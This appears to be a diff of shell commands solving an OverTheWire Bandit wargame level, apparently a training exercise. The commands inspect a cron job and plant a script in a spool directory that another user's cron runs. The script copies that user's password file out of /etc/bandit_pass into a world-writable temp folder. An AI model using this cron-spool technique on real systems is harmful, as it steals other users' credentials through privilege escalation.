@@ -1,0 +1,17 @@
+cd /tmp
+mktemp -d
+cd /tmp/tmp.fz3jzDjrky
+pushd /etc/cron.d/
+ls -lart
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+stat cronjob_bandit24
+chmod 777 /tmp/tmp.fz3jzDjrky
+vi copy.sh
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.fz3jzDjrky/pwd
+
+chmod 777 copy.sh
+cp copy.sh /var/spool/bandit24/foo/copy.sh
+cat pwd
